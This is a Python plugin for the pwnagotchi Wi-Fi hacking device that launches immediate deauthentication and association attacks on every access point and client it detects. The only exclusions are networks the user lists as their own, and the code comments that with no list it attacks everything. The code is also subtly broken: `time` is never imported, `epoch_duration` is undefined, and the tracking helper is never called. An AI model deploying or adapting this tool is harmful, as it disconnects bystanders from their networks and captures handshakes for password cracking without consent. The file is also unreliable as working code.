import logging

from pwnagotchi import plugins


class instattack(plugins.Plugin):
    __author__ = "129890632+Sniffleupagus@users.noreply.github.com"
    __version__ = "1.0.0"
    __license__ = "GPL3"
    __description__ = "Pwn more aggressively. Launch immediate associate or deauth attack when bettercap spots a device."

    def __init__(self):
        logging.debug("instattack plugin created")
        self._agent = None
        self.old_name = None
        self.recents = {}

    # called before the plugin is unloaded
    def on_unload(self, ui):
        if self.old_name:
            ui.set("name", f"{self.old_name} ")
        else:
            ui.set("name", "{}>  ".format(ui.get("name")[:-3]))
        self.old_name = None
        logging.info("instattack out.")

    # called to setup the ui elements
    def on_ui_setup(self, ui):
        self._ui = ui

    def on_ui_update(self, ui):
        if self.old_name is None:
            self.old_name = ui.get("name")
            if self.old_name:
                i = self.old_name.find(">")
                if i:
                    ui.set("name", "{}{}".format(self.old_name[:i], "!!!"))

    # called when everything is ready and the main loop is about to start
    def on_ready(self, agent):
        self._agent = agent
        logging.info("instattack attack!")
        agent.run("wifi.clear")
        if self._ui:
            self._ui.set("status", "Be aggressive!\nBE BE AGGRESSIVE!")


    # REQUIRES: https://github.com/evilsocket/pwnagotchi/pull/1192
    #
    # PR to pass on all bettercap events to interested plugins. bettercap event
    # name is used to make an "on_" handler to plugins, like below.

    def track_recent(self, ap, cl=None):
        ap["_track_time"] = time.time()
        self.recents[ap["mac"].lower()] = ap
        if cl:
            cl["_track_time"] = ap["_track_time"]
            self.recents[cl["mac"].lower()] = cl

    def ok_to_attack(self, ap):
        """
        Check if target is allowed based on blacklist.
        
        Blacklist protects YOUR OWN networks from being attacked.
        If blacklist is empty, all targets are allowed.
        """
        if not self._agent:
            return True
        
        # Get blacklist (your own networks to protect)
        blacklist = self._agent._config.get("main", {}).get("blacklist", [])
        if not blacklist:
            return True  # No blacklist = attack everything
        
        blacklist = [x.lower() for x in blacklist]
        hostname = ap.get("hostname", "").lower()
        mac = ap.get("mac", "").lower()
        oui = mac[:8].lower() if mac else ""
        
        # Block if in blacklist
        if hostname in blacklist or mac in blacklist or oui in blacklist:
            return False
        
        return True

    def on_bcap_wifi_ap_new(self, agent, event):
        try:
            ap = event["data"]
            if agent._config["personality"]["associate"] and self.ok_to_attack(ap):
                logging.info("insta-associate: {} ({})".format(ap["hostname"], ap["mac"]))
                agent.associate(ap, 0.3)
        except Exception as e:
            logging.exception(repr(e))

    def on_bcap_wifi_client_new(self, agent, event):
        try:
            ap = event["data"]["AP"]
            cl = event["data"]["Client"]
            if agent._config["personality"]["deauth"] and self.ok_to_attack(ap) and self.ok_to_attack(cl):
                logging.info("insta-deauth: {} ({})->'{}'({})({})".format(ap["hostname"], ap["mac"],
                                                                      cl["hostname"], cl["mac"], cl["vendor"]))
                agent.deauth(ap, cl, 0.75)
        except Exception as e:
            logging.exception(repr(e))

    def on_handshake(self, agent, filename, ap, cl):
        logging.info("insta-shake? {}".format(ap["mac"]))
        if "mac" in ap and "mac" in cl:
            amac = ap["mac"].lower()
            cmac = cl["mac"].lower()
            if amac in self.recents:
                logging.info("insta-shake!!! {} ({})->'{}'({})({})".format(ap["hostname"], ap["mac"],
                                                                       cl["hostname"], cl["mac"], cl["vendor"]))
                del self.recents[amac]
                if cmac in self.recents:
                    del self.recents[cmac]

    def on_epoch(self, agent, epoch, epoch_data):
        for mac in self.recents:
            if self.recents[mac]["_track_time"] < (time.time() - (self.epoch_duration * 2)):
                del self.recents[mac]
